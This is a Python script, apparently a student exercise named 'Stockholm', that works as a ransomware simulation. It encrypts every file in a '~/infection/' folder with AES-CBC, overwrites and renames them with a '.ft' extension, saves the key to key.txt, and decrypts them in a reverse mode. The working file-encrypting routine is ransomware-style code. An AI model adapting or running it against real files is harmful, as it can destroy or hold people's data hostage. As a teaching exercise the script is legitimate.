import os
from utils import Arguments, Extensions, print_content, print_header, _change_color, bcolors
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import hashlib

extensions = []

class Stockholm(Arguments, Extensions):
    def __init__(self):
        super().__init__()
        if self.version:
            self.display_version()
        if self.help:
            self.display_help()
            exit()
        
        self.iv = "Red-Taylor-Swift"
        self.path = os.path.expanduser("~/infection/")
        self.files = [file for file in os.listdir(self.path) if os.path.isfile(self.path + file)]
        self.files_ext = [self.path + f for f in self.files]
        if self.reverse is None:
            self.raw_key = get_random_bytes(8)
            self.key = self.raw_key.hex()
            self.raw_key = hashlib.sha256(self.raw_key).digest()[:16]
            with open("key.txt", 'wb') as f:
                f.write(self.key.encode())
            
        else :
            self.key = self.reverse[0]
            self.raw_key = hashlib.sha256(bytes.fromhex(self.key)).digest()[:16]
        if not self.silent :
            _change_color(bcolors.MAGENTA)
            print_header("BASIC INFO")
            _change_color(bcolors.ENDC)
            print(f"This is your key: {(self.key)}")
            print("Raw Key:", self.raw_key)
            print("IV ():", self.iv)
            print("Files:")
            print(self.files_ext)
        
    
    def start(self):
        if self.reverse is not None:
            self.decrypt()
        else:
            self.encrypt()
    
    
    def encrypt(self):
        if not self.silent:
            _change_color(bcolors.RED)
            print_header("ENCRYPT BEGINS")
            _change_color(bcolors.ENDC)
        for i in range(len(self.files)):
            self.cipher = AES.new(self.raw_key, AES.MODE_CBC, self.iv.encode('utf-8'))
            
            f = self.files_ext[i]
            content = ""
            with open(f, 'rb') as r:
                content = r.read()

            file_name = self.files[i]
            
            if not self.silent:
                _change_color(bcolors.BLUE)
                print("\nFilename:")
                _change_color(bcolors.ENDC)

                print_content(file_name, content)
            
            file_name_bytes = file_name.encode()            
            content_file = self.cipher.encrypt(pad(file_name_bytes + content, AES.block_size))
            
            file_name_len = len(file_name_bytes).to_bytes(2, "big")
            
            content = file_name_len  + content_file
            
            with open(f, 'wb') as w:
                w.write(content)
            
            if file_name.endswith(".ft"):
                continue
            os.rename(f, self.path + file_name + ".ft")
            if not self.silent:
                print_content(f"New Content:", content)
        if not self.silent:
            _change_color(bcolors.RED)
            print_header("ENCRYPT ENDS")
            _change_color(bcolors.ENDC)
        return


    def decrypt(self):
        if not self.silent:
            _change_color(bcolors.GREEN)
            print_header("DECRYPT BEGINS")
            _change_color(bcolors.ENDC)
        for i in range(len(self.files)):
            self.cipher = AES.new(self.raw_key, AES.MODE_CBC, self.iv.encode('utf-8'))
            
            f = self.files_ext[i]
            content = ""
            with open(f, 'rb') as r:
                content = r.read()

            file_name = self.files[i]
            if not self.silent:
                _change_color(bcolors.BLUE)
                print("\nFilename:")
                _change_color(bcolors.ENDC)
                print_content(file_name, content)

            file_name_len = int.from_bytes(content[:2], "big")
            
            content_file = content[2 : ]
            content_padded = self.cipher.decrypt(content_file)
            content = unpad(content_padded, AES.block_size)
            print(content)
            file_name = content[ : file_name_len].decode(errors='ignore')
            content = content[file_name_len : ]
            
            current_file_name = self.files[i]
            
            if current_file_name != file_name:
                os.rename(f, self.path + file_name)
                current_file_name = self.path + file_name
            
            f = current_file_name
            with open(f, 'wb') as w:
                w.write(content)
            if not self.silent:
                print_content(f"New Content:", content)
        if not self.silent:
            _change_color(bcolors.GREEN)
            print_header("DECRYPT ENDS")
            _change_color(bcolors.ENDC)
        return
        
s = Stockholm()
s.start()

